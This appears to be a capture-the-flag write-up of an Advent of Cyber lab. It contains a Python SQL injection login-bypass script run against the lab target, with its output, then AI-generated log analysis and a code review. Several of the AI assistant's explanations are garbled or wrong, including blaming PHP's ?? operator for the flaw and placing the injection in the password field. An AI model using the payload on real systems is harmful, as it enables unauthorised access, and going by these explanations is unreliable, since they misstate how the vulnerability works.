
### Red team - generate exploit

AI Assistant
Welcome to the Red Team showcase! I can help you generate Python scripts for the vulnerabilities within the web application of today's Advent of Cyber web application.

Shall we begin?

You
go ahead

AI Assistant
The vulnerability in the login.php script is a SQL injection attack where an untrusted input is treated as a string, allowing attackers to execute arbitrary SQL code. The username field is vulnerable because the input is directly concatenated into the SQL query, which can be exploited to execute malicious code. For example, if an attacker inputs "alice" instead of "alice", the query checks if the username is "alice", which it is, and then executes the SQL code.

HOW TO SAVE THE FILE:
1. Open a terminal or visual editor (e.g., Sublime Text).
2. Use the command nano script.py to create the Python script.
3. Paste the script code (which will run on localhost:5000) into the file.
4. Save the file with Ctrl + O and exit using Ctrl + X.
5. Run the script via python3 script.py to test the vulnerability.

Once you have the script, click "Complete Stage to Continue" to proceed.


```python
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

response when run

```html
┌──(fixit42㉿kali)-[~/boxes/thm/aoc2025-day4]
└─$ python3 exploit.py           
Response Status Code: 200

Response Headers:
  Date: Fri, 05 Dec 2025 17:40:17 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>
        
        
        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        
        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>
    
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>

```

THM{SQLI_EXPLOIT}


### Blue team - analyse logs

AI Assistant
Welcome to the Blue Team showcase! I'm your Blue Team Assistant. I can analyse logs and explain them.

Let's solve this stage together. You can ask me to analyse an example set of logs for the attack that we just performed!
You
please analyse the logs
AI Assistant
Log Entry:
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

#### Analysis of the Logs
1. IP Address and Time: The log shows the user’s IP address (198.51.100.22) and the timestamp (03/Oct/2025:09:03:11 +0100), indicating the time the attack was performed.

2. URL and Action: The user accessed the /login.php page, which is a common login endpoint.

3. Username Attempt: The username "alice" was attempted, and the SQL injection attempt is evident in the password parameter. The string "alice%27+OR+1%3D1+--+-&password=test" suggests that the application was vulnerable to SQL injection, as it includes a malicious SQL query.

4. Importance for a Blue Team:
- Vulnerability Identification: This log entry highlights a potential security flaw in the application, showing that the system is susceptible to SQL injection attacks.
- Proactive Measures: Detecting such vulnerabilities allows the Blue Team to prioritize security improvements, such as implementing input validation, using parameterized queries, and updating software.

---

Why This Matters:
Logging such events is crucial for identifying and mitigating security risks. It helps the Blue Team understand the scope of the issue and take immediate action to protect the system.

Next Steps:
- If you're ready to continue, please click the "Complete Stage to Continue" button.
AI Assistant

198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-re

### Software

AI Assistant
Welcome to the Software showcase! I can help you identify vulnerabilities in source code.

Shall we take a look at the source code of today's Advent of Cyber web application?

You
yes please

AI Assistant

<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

// Vulnerability: SQL injection
// Explanation: The ?? operator is used to get a value, which can be a string. If the user inputs a string, it's vulnerable because the database might be queried with that string.



1. Identification of the specific vulnerability:
The code uses ?? to get a value, which is a common SQL injection vulnerability. It allows attackers to inject malicious SQL code into the database.

2. Explanation of why the code is vulnerable:
The ?? operator is used to get a value, which can be a string. If the user inputs a string, it's vulnerable because the database might be queried with that string, potentially leading to unauthorized access or data theft.

3. Best practices for preventing similar issues:
- Use prepared statements or parameterized queries to prevent SQL injection.
- Validate and sanitize user input to prevent injection.
- Use input validation to ensure only valid data is processed.

4. Tools and techniques for code security testing:
- Use tools like SQLMap or XAMPP to test for SQL injection vulnerabilities.
- Implement input validation and output encoding to prevent injection attacks.

If you're happy with the explanation, please click "Complete Showcase!" to continue.
